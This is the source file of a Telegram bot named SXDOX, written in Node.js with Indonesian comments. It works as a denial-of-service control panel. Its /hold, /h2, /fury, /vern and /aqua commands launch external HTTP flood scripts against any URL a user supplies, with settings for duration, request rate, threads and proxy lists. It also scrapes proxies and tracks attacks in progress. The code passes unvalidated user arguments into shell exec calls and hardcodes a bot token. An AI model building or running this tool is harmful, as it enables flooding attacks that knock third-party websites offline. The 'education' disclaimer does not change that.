/**
 * Telegram Bot SXDOX
 * Copyright (c) 2025 Claritiano Samosir
 * All rights reserved.
 * 
 * Bot ini dikembangkan untuk kebutuhan edukasi dan riset.
 * Dilarang keras menggunakan bot ini untuk aktivitas ilegal.
 */

const Telegraf = require("telegraf").Telegraf;
const { exec } = require("child_process");
const fs = require("fs");
const path = require("path");
const axios = require("axios");

// Daftar user yang diizinkan. Ambil dari bot cekid telegram
const ALLOWED_USERS = [28962863]; // Ganti dengan ID user yang diizinkan

// Token bot Telegram ( Ambil Tokennya dari botfather https://t.me/botfather )
const BOT_TOKEN = "1896122896:AAFmwD_2ajEzaDJacF1YeDfbwXW4";
const bot = new Telegraf(BOT_TOKEN);

// Fungsi pencatatan aktivitas
function writeLog(msg) {
  const time = new Date().toISOString();
  fs.appendFileSync("logs.txt", `[${time}] ${msg}\n`);
}

// Start command
bot.start(ctx => {
  ctx.reply(`👋 Selamat datang di SXDOX Bot!
Berikut beberapa perintah utama:

/menu - lihat daftar perintah
/hold <url> <durasi> <rate> <thread> <proxy.txt>

Contoh:
/hold https://example.com 60 100 10 proxy.txt
`);
});

// Menu utama
bot.command("menu", ctx => {
  ctx.replyWithMarkdown(`
📜 *SXDOX Menu*  
Perintah yang tersedia:

🆔 /myid — Info akun Telegram  
🛡️ /addplan <id> — Tambah user (khusus admin)  
🚀 /hold <url> <durasi> <rate> <thread> <proxy.txt> — Mulai serangan  
🌐 /proxy — Scrape proxy otomatis  
📋 /ongoing — Daftar hold terakhir  
📜 /menu — Tampilkan menu  
❌ /stop - hentikan hold  
📥 /gethtml <url> — Ambil HTML dari URL  
📂 /method — Daftar method tersedia

Gunakan dengan bijak.
`);
});

// Daftar method dari file JSON
bot.command("method", async ctx => {
  const file = path.resolve(__dirname, "method.json");
  await ctx.reply("⏳ Memuat daftar method...");

  if (!fs.existsSync(file)) {
    return ctx.replyWithMarkdown("⚠️ *method.json* tidak ditemukan.");
  }

  try {
    const raw = fs.readFileSync(file, "utf8");
    const json = JSON.parse(raw);
    if (!json.methods || !Array.isArray(json.methods) || !json.methods.length) {
      return ctx.replyWithMarkdown("📁 *method.json* kosong.");
    }
    const list = json.methods.map((m, i) => `🔹 ${i + 1}. ${m}`).join("\n");
    ctx.replyWithMarkdown(`📜 *Method Tersedia:*\n\n${list}\n\n🛠️ Gunakan dengan bijak.`);
  } catch (e) {
    ctx.replyWithMarkdown("❌ Gagal membaca *method.json*.");
  }
});

// Scrape proxy
bot.command("proxy", ctx => {
  const user = ctx.from.username || ctx.from.id;
  ctx.reply("🔄 Mengambil proxy, mohon tunggu...");

  exec("node scrape.js", (err, stdout, stderr) => {
    if (err) {
      ctx.reply("❌ Gagal scraping proxy.");
      ctx.reply(`📄 Error:\n\`\`\`\n${stderr || err.message}\n\`\`\``);
      writeLog(`❌ Proxy scrape gagal oleh ${user}: ${stderr || err.message}`);
      return;
    }
    fs.readFile("proxy.txt", "utf8", (e, data) => {
      if (e || !data.trim()) {
        ctx.reply("⚠️ Proxy kosong atau gagal dibaca.");
        writeLog(`⚠️ Proxy kosong setelah scrape oleh ${user}`);
        return;
      }
      ctx.reply(`✅ Proxy berhasil diambil (${data.split('\n').length} entri).`);
      writeLog(`✅ Proxy diambil (${data.split('\n').length}) oleh ${user}`);
    });
  });
});

// ongoingHolds untuk tracking proses
const ongoingHolds = [];

// /hold command
bot.command("hold", ctx => {
  const params = ctx.message.text.split(" ").slice(1);
  if (params.length < 5) {
    return ctx.reply("❌ Format: /hold <url> <durasi> <rate> <thread> <proxy.txt>");
  }
  const [url, dur, rate, thread, proxyFile] = params;
  const durasi = parseInt(dur), r = parseInt(rate), t = parseInt(thread);
  const proxyPath = path.join(__dirname, proxyFile);

  if (!/^https?:\/\//.test(url)) return ctx.reply("❌ URL tidak valid.");
  if ([durasi, r, t].some(x => isNaN(x) || x <= 0)) return ctx.reply("❌ Durasi, rate, thread harus angka > 0.");
  if (!fs.existsSync(proxyPath)) return ctx.reply(`❌ Proxy '${proxyFile}' tidak ditemukan.`);

  const cmd = `node hold.js ${url} ${durasi} ${r} ${t} ${proxyFile}`;
  ctx.reply(`🕐 Menjalankan:\n🌐 ${url}\n⏱ ${durasi}s\n🚀 ${r}\n🧵 ${t}\n🧩 ${proxyFile}`);
  writeLog(`📥 ${ctx.from.username || ctx.from.id} menjalankan: ${cmd}`);

  ongoingHolds.push({
    user: ctx.from.username || ctx.from.id,
    url, durasi, rate: r, thread: t, proxyFile,
    startTime: new Date().toISOString()
  });

  exec(cmd, (err, stdout, stderr) => {
    if (err) {
      ctx.reply(`⚠️ Gagal:\n\n${stderr}`);
      writeLog(`❌ ERROR ${ctx.from.username || ctx.from.id}: ${stderr}`);
      return;
    }
    ctx.reply(`✅ Berhasil!\n\n📝 Output:\n${stdout || "Tidak ada output."}`);
    writeLog(`✅ Berhasil: ${stdout}`);
  });
});

// /h2 <url> <durasi> <rate> <thread> <proxy.txt>
bot.command("h2", (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);

  if (args.length < 5) {
    return ctx.reply("❌ Format salah.\n\nGunakan:\n/h2 <url> <durasi> <rate> <thread> <proxy.txt>");
  }

  const [url, durasiStr, rateStr, threadStr, proxyFile] = args;
  const durasi = parseInt(durasiStr);
  const rate = parseInt(rateStr);
  const thread = parseInt(threadStr);
  const proxyPath = path.join(__dirname, proxyFile);

  // Validasi URL
  const urlPattern = /^(https?:\/\/)[^\s$.?#].[^\s]*$/gm;
  if (!urlPattern.test(url)) {
    return ctx.reply("❌ URL tidak valid. Harus diawali dengan http:// atau https://");
  }

  if ([durasi, rate, thread].some(v => isNaN(v) || v <= 0)) {
    return ctx.reply("❌ Durasi, rate, dan thread harus berupa angka lebih dari 0.");
  }

  if (!fs.existsSync(proxyPath)) {
    return ctx.reply(`❌ File proxy '${proxyFile}' tidak ditemukan.`);
  }

  const cmd = `node h2-hanz.js ${url} ${durasi} ${rate} ${thread} ${proxyFile}`;

  ctx.reply(
    `🚀 Menjalankan H2 attack...\n\n📄 Detail:\n` +
    `🌐 URL: ${url}\n` +
    `⏱ Durasi: ${durasi} detik\n` +
    `📈 Rate: ${rate}\n` +
    `🧵 Thread: ${thread}\n` +
    `📂 Proxy File: ${proxyFile}\n\n` +
    `⏳ Tunggu hingga proses selesai...`
  );

  writeLog(`🚀 Perintah H2 oleh ${ctx.from.username || ctx.from.id}: ${cmd}`);

  const holdInfo = {
    user: ctx.from.username || ctx.from.id,
    url,
    durasi,
    rate,
    thread,
    proxyFile,
    type: "h2",
    startTime: new Date().toISOString()
  };

  ongoingHolds.push(holdInfo);

  exec(cmd, (err, stdout, stderr) => {
    if (err) {
      ctx.reply(`❌ Terjadi kesalahan saat menjalankan script:\n\`\`\`\n${stderr || err.message}\n\`\`\``, { parse_mode: "Markdown" });
      writeLog(`❌ Error H2 oleh ${ctx.from.username || ctx.from.id}: ${stderr || err.message}`);
      return;
    }

    // Hitung waktu selesai
    const selesai = new Date();
    const mulai = new Date(holdInfo.startTime);
    const waktuJalan = Math.floor((selesai - mulai) / 1000);

    ctx.reply(
      `✅ Script selesai dijalankan.\n\n📊 Rangkuman:\n` +
      `🔗 URL: ${url}\n` +
      `⏱ Waktu: ${waktuJalan}s\n` +
      `🧾 Log: Tersimpan.\n`
    );

    writeLog(`✅ H2 selesai oleh ${ctx.from.username || ctx.from.id} (Durasi: ${waktuJalan}s)`);
  });
});

// /fury <method> <url> <durasi> <thread> <rate> <proxy.txt>
bot.command("fury", (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);

  if (args.length < 6) {
    return ctx.reply(
      "❌ Format salah.\n\nGunakan:\n/fury <method> <url> <durasi> <thread> <rate> <proxy.txt> [opsi]\n\n" +
      "Contoh:\n/fury GET https://example.com 60 16 90 proxy.txt --query 1 --cookie \"abc=123\" --referer https://google.com"
    );
  }

  const [method, url, durasiStr, threadStr, rateStr, proxyFile, ...extraArgs] = args;

  const durasi = parseInt(durasiStr);
  const thread = parseInt(threadStr);
  const rate = parseInt(rateStr);
  const proxyPath = path.join(__dirname, proxyFile);

  // Validasi umum
  if (!/^https?:\/\//.test(url))
    return ctx.reply("❌ URL harus diawali dengan http:// atau https://");

  if ([durasi, thread, rate].some((v) => isNaN(v) || v <= 0))
    return ctx.reply("❌ Durasi, thread, dan rate harus berupa angka > 0.");

  if (!fs.existsSync(proxyPath))
    return ctx.reply(`❌ File proxy '${proxyFile}' tidak ditemukan di direktori bot.`);

  // Validasi opsional: method HTTP
  const allowedMethods = ["GET", "POST", "PUT", "HEAD", "DELETE", "OPTIONS", "PATCH"];
  if (!allowedMethods.includes(method.toUpperCase()))
    return ctx.reply(`❌ Method HTTP '${method}' tidak valid. Gunakan salah satu dari: ${allowedMethods.join(", ")}`);

  const extra = extraArgs.join(" ");
  const cmd = `node H2-FURY.js ${method} "${url}" ${durasi} ${thread} ${rate} "${proxyFile}" ${extra}`;

  // Tampilkan semua parameter yang akan digunakan
  ctx.reply(
    `🔥 Menjalankan *FURY* attack dengan parameter berikut:\n\n` +
    `🌐 URL: ${url}\n` +
    `🛠 Method: ${method.toUpperCase()}\n` +
    `⏱ Durasi: ${durasi} detik\n` +
    `🧵 Thread: ${thread}\n` +
    `📈 Rate: ${rate} rps\n` +
    `📂 Proxy: ${proxyFile}` +
    (extra ? `\n⚙️ Opsi Tambahan: \`${extra}\`` : ''),
    { parse_mode: "Markdown" }
  );

  // Logging ke file atau memori
  writeLog(`🚀 FURY oleh ${ctx.from.username || ctx.from.id}: ${cmd}`);

  ongoingHolds.push({
    user: ctx.from.username || ctx.from.id,
    url,
    durasi,
    rate,
    thread,
    proxyFile,
    type: "fury",
    startTime: new Date().toISOString(),
    options: extra
  });

  exec(cmd, (err, stdout, stderr) => {
    if (err) {
      ctx.reply(`❌ *FURY gagal dijalankan:*\n\`\`\`\n${stderr || err.message}\n\`\`\``, { parse_mode: "Markdown" });
      writeLog(`❌ FURY error oleh ${ctx.from.username || ctx.from.id}:\n${stderr || err.message}`);
      return;
    }

    ctx.reply(`✅ *FURY selesai dijalankan!*\nOutput:\n\`\`\`\n${stdout.trim()}\n\`\`\``, { parse_mode: "Markdown" });
    writeLog(`✅ FURY sukses ${url} oleh ${ctx.from.username || ctx.from.id}`);
  });
});

// /vern <url> <durasi> <rate> <thread> <proxy.txt>
bot.command("vern", (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);

  // Cek jumlah argumen minimum
  if (args.length < 6) {
    return ctx.reply(
      "❌ *Format salah!*\n\nGunakan perintah berikut:\n\n" +
      "`/vern <url> <durasi> <rate> <thread> <proxy.txt> [opsi]`\n\n" +
      "*Contoh penggunaan:*\n" +
      "`/vern https://example.com 90 100 10 proxy.txt --cookie \"user=abc\" --flood --referers rand`\n\n" +
      "*Keterangan Argumen:*\n" +
      "- `<url>`: Target URL (wajib pakai http/https)\n" +
      "- `<durasi>`: Waktu serangan dalam detik\n" +
      "- `<rate>`: Jumlah request per detik\n" +
      "- `<thread>`: Jumlah thread\n" +
      "- `<proxy.txt>`: File proxy yang digunakan\n" +
      "- `[opsi]`: Argumen tambahan (opsional, contoh: `--cookie`, `--flood`, dll)",
      { parse_mode: "Markdown" }
    );
  }

  // Ambil dan parsing argumen
  const [url, durasiStr, rateStr, threadStr, proxyFile, ...extraArgs] = args;
  const durasi = parseInt(durasiStr);
  const rate = parseInt(rateStr);
  const thread = parseInt(threadStr);
  const proxyPath = path.join(__dirname, proxyFile);
  const extra = extraArgs.join(" ");

  // Validasi URL
  if (!/^https?:\/\//i.test(url)) {
    return ctx.reply("❌ *URL tidak valid!* Harus diawali dengan `http://` atau `https://`.", { parse_mode: "Markdown" });
  }

  // Validasi durasi, rate, dan thread
  if ([durasi, rate, thread].some((val) => isNaN(val) || val <= 0)) {
    return ctx.reply("❌ *Durasi, rate, dan thread harus berupa angka positif!*", { parse_mode: "Markdown" });
  }

  // Cek keberadaan file proxy
  if (!fs.existsSync(proxyPath)) {
    return ctx.reply(`❌ *File proxy* \`${proxyFile}\` *tidak ditemukan!*`, { parse_mode: "Markdown" });
  }

  // Bangun perintah untuk dieksekusi
  const cmd = `node H2-VERN.js "${url}" ${durasi} ${rate} ${thread} "${proxyFile}" ${extra}`;

  // Kirim info eksekusi ke pengguna
  ctx.reply(
    `🚀 *Menjalankan VERN Attack!*\n\n` +
    `📌 *URL:* ${url}\n` +
    `⏱ *Durasi:* ${durasi} detik\n` +
    `📈 *Rate:* ${rate} req/detik\n` +
    `🧵 *Thread:* ${thread}\n` +
    `📂 *Proxy:* ${proxyFile}\n` +
    (extra ? `⚙️ *Opsi Tambahan:* \`${extra}\`` : ''),
    { parse_mode: "Markdown" }
  );

  // Catat aktivitas
  writeLog(`🧨 VERN dijalankan oleh ${ctx.from.username || ctx.from.id}: ${cmd}`);

  // Simpan data sesi serangan
  ongoingHolds.push({
    user: ctx.from.username || ctx.from.id,
    url,
    durasi,
    rate,
    thread,
    proxyFile,
    type: "vern",
    options: extra,
    startTime: new Date().toISOString()
  });

  // Eksekusi perintah
  exec(cmd, (err, stdout, stderr) => {
    if (err) {
      const errMsg = stderr || err.message || "Tidak diketahui";
      ctx.reply(`❌ *VERN gagal dijalankan:*\n\`\`\`\n${errMsg}\n\`\`\``, { parse_mode: "Markdown" });
      writeLog(`❌ VERN error oleh ${ctx.from.username || ctx.from.id}:\n${errMsg}`);
      return;
    }

    // Jika sukses
    ctx.reply(`✅ *VERN selesai dijalankan!*\n\n📤 *Output:*\n\`\`\`\n${stdout.trim() || "Tidak ada output."}\n\`\`\``, { parse_mode: "Markdown" });
    writeLog(`✅ VERN sukses ${url} oleh ${ctx.from.username || ctx.from.id}`);
  });
});

// /aqua <url> <durasi> <rate> <thread> <proxy.txt>
bot.command("aqua", (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);

  if (args.length < 5) {
    return ctx.reply(
      "❌ Format perintah salah.\n\n" +
      "📝 Format yang benar:\n" +
      "/aqua <url> <durasi> <rate> <thread> <proxy.txt>\n\n" +
      "📌 Contoh:\n" +
      "/aqua https://example.com 60 100 10 proxy.txt\n\n" +
      "Keterangan:\n" +
      "• url: URL target (harus diawali dengan http/https)\n" +
      "• durasi: waktu serangan dalam detik\n" +
      "• rate: jumlah permintaan per detik\n" +
      "• thread: jumlah thread paralel\n" +
      "• proxy.txt: file proxy yang akan digunakan"
    );
  }

  const [url, durasiStr, rateStr, threadStr, proxyFile] = args;
  const durasi = parseInt(durasiStr, 10);
  const rate = parseInt(rateStr, 10);
  const thread = parseInt(threadStr, 10);
  const proxyPath = path.join(__dirname, proxyFile);

  // Validasi URL
  if (!/^https?:\/\/[^\s/$.?#].[^\s]*$/i.test(url)) {
    return ctx.reply("❌ URL tidak valid. Pastikan diawali dengan http:// atau https:// dan merupakan URL yang lengkap.");
  }

  // Validasi angka
  if ([durasi, rate, thread].some((v) => isNaN(v) || v <= 0)) {
    return ctx.reply("❌ Durasi, rate, dan thread harus berupa angka positif lebih dari 0.");
  }

  // Validasi keberadaan file proxy
  if (!fs.existsSync(proxyPath)) {
    return ctx.reply(`❌ File proxy '${proxyFile}' tidak ditemukan di direktori bot.`);
  }

  // Validasi konten file proxy
  const proxyContent = fs.readFileSync(proxyPath, "utf8").trim();
  const proxyLines = proxyContent.split("\n").filter(line => line.trim() !== "");
  if (proxyLines.length === 0) {
    return ctx.reply(`❌ File proxy '${proxyFile}' kosong atau tidak memiliki format yang sesuai.`);
  }

  const cmd = `node AQUA.js "${url}" ${durasi} ${rate} ${thread} "${proxyFile}"`;

  ctx.reply(
    `💧 *Menjalankan AQUA Attack...*\n\n` +
    `🌐 Target: ${url}\n` +
    `⏱ Durasi: ${durasi} detik\n` +
    `🚀 Rate: ${rate} req/s\n` +
    `🧵 Thread: ${thread}\n` +
    `📂 Proxy: ${proxyFile} (${proxyLines.length} baris)\n\n` +
    `🔄 Mohon tunggu hingga proses selesai...`,
    { parse_mode: "Markdown" }
  );

  writeLog(`💧 AQUA attack dimulai oleh ${ctx.from.username || ctx.from.id}: ${cmd}`);

  // Simpan riwayat serangan
  ongoingHolds.push({
    user: ctx.from.username || ctx.from.id,
    url,
    durasi,
    rate,
    thread,
    proxyFile,
    type: "aqua",
    startTime: new Date().toISOString()
  });

  // Eksekusi perintah
  exec(cmd, (err, stdout, stderr) => {
    if (err) {
      ctx.reply(
        `❌ *Gagal menjalankan AQUA:*\n\`\`\`\n${stderr || err.message}\n\`\`\``,
        { parse_mode: "Markdown" }
      );
      writeLog(`❌ AQUA error oleh ${ctx.from.username || ctx.from.id}:\n${stderr || err.message}`);
      return;
    }

    ctx.reply(
      `✅ *AQUA selesai dijalankan!*\n` +
      `📤 Output:\n\`\`\`\n${stdout.trim()}\n\`\`\``,
      { parse_mode: "Markdown" }
    );
    writeLog(`✅ AQUA sukses ${url} oleh ${ctx.from.username || ctx.from.id}`);
  });
});

bot.command("ongoing", (ctx) => {
  if (ongoingHolds.length === 0) {
    return ctx.reply("📭 Tidak ada proses hold yang sedang atau pernah berjalan.");
  }

  let message = "📋 Daftar Proses Hold Terakhir (maks. 10 data):\n\n";
  const recentHolds = ongoingHolds.slice(-10).reverse();

  recentHolds.forEach((item, index) => {
    message += `📦 Hold #${index + 1}\n`;
    message += `👤 User: ${item.user}\n`;
    message += `🌐 URL: ${item.url}\n`;
    message += `⏱ Durasi: ${item.durasi} detik\n`;
    message += `🚀 Rate: ${item.rate} | 🧵 Thread: ${item.thread}\n`;
    message += `🧩 Proxy: ${item.proxyFile}\n`;
    message += `🕒 Mulai: ${new Date(item.startTime).toLocaleString()}\n`;

    if (item.endTime) {
      message += `⏹ Selesai: ${new Date(item.endTime).toLocaleString()}\n`;
    }

    message += `📍 Status: ${item.status || "Tidak diketahui"}\n`;
    message += "—".repeat(30) + "\n\n";
  });

  ctx.reply(message);
});

bot.command("myid", (ctx) => {
  const user = ctx.from;

  const message = `
🆔 *Informasi Telegram Anda*  
─────────────────────────────  
👤 *Nama:* ${user.first_name || "-"} ${user.last_name || ""}
📛 *Username:* @${user.username || "-"}
🔢 *ID:* \`${user.id}\`
🌐 *Bahasa:* ${user.language_code || "-"}
📅 *Tanggal:* ${new Date().toLocaleDateString("id-ID")}
  
Terima kasih telah menggunakan bot ini! 🙌
`;

  ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("addplan", (ctx) => {
  const senderId = ctx.from.id;

  // Cek apakah pengirim adalah admin
  if (!ADMIN_IDS.includes(senderId)) {
    ctx.reply("❌ Anda tidak diizinkan menambahkan akses. Hanya admin yang dapat menjalankan perintah ini.");
    return;
  }

  // Ambil argumen ID pengguna
  const args = ctx.message.text.split(" ").slice(1);

  // Validasi argumen
  if (args.length === 0) {
    ctx.reply("⚠️ Format salah.\nGunakan format:\n`/addplan <id_pengguna>`", {
      parse_mode: "Markdown"
    });
    return;
  }

  const newId = parseInt(args[0]);

  // Validasi ID numerik
  if (isNaN(newId)) {
    ctx.reply("❌ ID pengguna harus berupa angka.");
    return;
  }

  // Cek apakah user sudah punya akses
  if (ALLOWED_USERS.includes(newId)) {
    ctx.reply("ℹ️ Pengguna dengan ID tersebut sudah memiliki akses.");
    return;
  }

  // Tambahkan ID ke daftar pengguna yang diizinkan
  ALLOWED_USERS.push(newId);

  // Balasan sukses
  ctx.reply(`✅ Akses berhasil diberikan untuk pengguna dengan ID: \`${newId}\``, {
    parse_mode: "Markdown"
  });

  // Log aktivitas
  const adminUsername = ctx.from.username ? `@${ctx.from.username}` : ctx.from.id;
  writeLog(`🛡️ Admin ${adminUsername} menambahkan akses untuk ID: ${newId}`);
});

bot.command("stop", (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const username = ctx.from.username || ctx.from.id;

  if (args.length < 1) {
    return ctx.reply("❌ Format salah. Gunakan:\n/stop <URL>");
  }

  const urlToStop = args[0];

  // Validasi sederhana URL (bisa disesuaikan dengan regex lebih kuat)
  if (!urlToStop.startsWith("http://") && !urlToStop.startsWith("https://")) {
    return ctx.reply("⚠️ URL tidak valid. Harus diawali dengan http:// atau https://");
  }

  const index = ongoingHolds.findIndex(h => h.url === urlToStop && !h.endTime);

  if (index === -1) {
    return ctx.reply(`⚠️ Tidak ditemukan proses aktif dengan URL: ${urlToStop}`);
  }

  const holdData = ongoingHolds[index];
  const endTime = new Date();
  const startTime = new Date(holdData.startTime);
  const durationMs = endTime - startTime;
  const durationMinutes = Math.floor(durationMs / 60000);
  const duration = durationMinutes > 0 ? `${durationMinutes} menit` : `${Math.floor(durationMs / 1000)} detik`;

  // Tandai sebagai dihentikan
  holdData.endTime = endTime.toISOString();
  holdData.status = "🛑 Dihentikan manual";

  // Balas ke user
  ctx.reply(
    `⛔ Proses hold untuk ${urlToStop} telah dihentikan.\n` +
    `📅 Durasi: ${duration}\n` +
    `👤 Dihentikan oleh: @${username}`
  );

  // Logging
  writeLog(
    `🛑 Proses hold untuk ${urlToStop} dihentikan oleh @${username} setelah ${duration}.`
  );

  // Notifikasi ke admin (jika ada)
  const adminId = process.env.ADMIN_CHAT_ID;
  if (adminId) {
    bot.telegram.sendMessage(adminId, `📢 @${username} menghentikan hold untuk:\n🔗 ${urlToStop}\n🕒 Durasi: ${duration}`);
  }
});

// Ambil dan tampilkan HTML dari URL
bot.command("gethtml", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const url = args[0];

  // Validasi URL dasar
  if (!url || !/^https?:\/\/[^\s]+$/i.test(url)) {
    return ctx.reply("❌ Format URL tidak valid. Gunakan:\n`/gethtml https://example.com`", {
      parse_mode: "Markdown"
    });
  }

  let messageStatus;
  try {
    // Kirim pesan loading dan simpan pesan tersebut
    messageStatus = await ctx.reply("⏳ Mengambil konten HTML dari URL, harap tunggu sebentar...");

    const response = await axios.get(url, {
      headers: {
        "User-Agent": "Mozilla/5.0 (TelegramBot/1.0)",
        "Accept": "text/html,application/xhtml+xml"
      },
      maxRedirects: 5,
      timeout: 10000 // 10 detik
    });

    const contentType = response.headers["content-type"] || "";
    const html = response.data;
    const finalUrl = response.request?.res?.responseUrl || url;

    // Pastikan konten bertipe HTML
    if (!contentType.includes("text/html")) {
      return ctx.reply(`⚠️ Konten bukan bertipe HTML.\nTipe konten: \`${contentType}\``, {
        parse_mode: "Markdown"
      });
    }

    const htmlLength = html.length;
    const previewText = htmlLength > 4000 ? html.slice(0, 4000) + "\n\n... (dipotong karena panjang)" : html;

    if (htmlLength > 4000) {
      const filename = `html_${Date.now()}.txt`;
      const filePath = path.join(__dirname, filename);
      fs.writeFileSync(filePath, html);

      await ctx.replyWithDocument({ source: filePath, filename });
      fs.unlinkSync(filePath); // Bersihkan file setelah dikirim

      await ctx.reply(`📄 HTML terlalu panjang (${htmlLength} karakter). Dikirim sebagai file.\nURL Final: ${finalUrl}`);
    } else {
      await ctx.reply(`📄 HTML dari:\n\`${finalUrl}\`\nPanjang: ${htmlLength} karakter\n\n\`\`\`\n${previewText}\n\`\`\``, {
        parse_mode: "Markdown"
      });
    }

    // Log aktivitas sukses
    writeLog(`✅ ${new Date().toISOString()} - ${ctx.from.username || ctx.from.id} ambil HTML dari ${url} (${htmlLength} chars)`);
  } catch (error) {
    console.error("Terjadi error saat mengambil HTML:", error.message);

    const msg = error.code === "ECONNABORTED"
      ? "⏱️ Permintaan melebihi batas waktu. Coba lagi nanti."
      : error.response
        ? `❌ Server mengembalikan status: ${error.response.status} ${error.response.statusText}`
        : "❌ Gagal mengambil HTML. Pastikan URL valid dan server dapat dijangkau.";

    ctx.reply(msg);

    writeLog(`❌ ${new Date().toISOString()} - Gagal ambil HTML oleh ${ctx.from.username || ctx.from.id} dari ${url}: ${error.message}`);
  } finally {
    if (messageStatus) {
      try {
        await ctx.telegram.deleteMessage(ctx.chat.id, messageStatus.message_id);
      } catch (e) {
        // tidak masalah jika gagal menghapus pesan loading
      }
    }
  }
});

bot.launch()
  .then(() => {
    console.log("✅ SXDOX Bot aktif!");
    console.log("🤖 Apa Perintahmu Tuan?...");
    console.log(`📅 Mulai: ${new Date().toLocaleString()}`);
  })
  .catch(err => {
    console.error("❌ Bot gagal dijalankan:", err);
  });

// Graceful shutdown
process.once('SIGINT', () => {
  console.log("🛑 Bot dihentikan (SIGINT)");
  bot.stop('SIGINT');
});
process.once('SIGTERM', () => {
  console.log("🛑 Bot dihentikan (SIGTERM)");
  bot.stop('SIGTERM');
});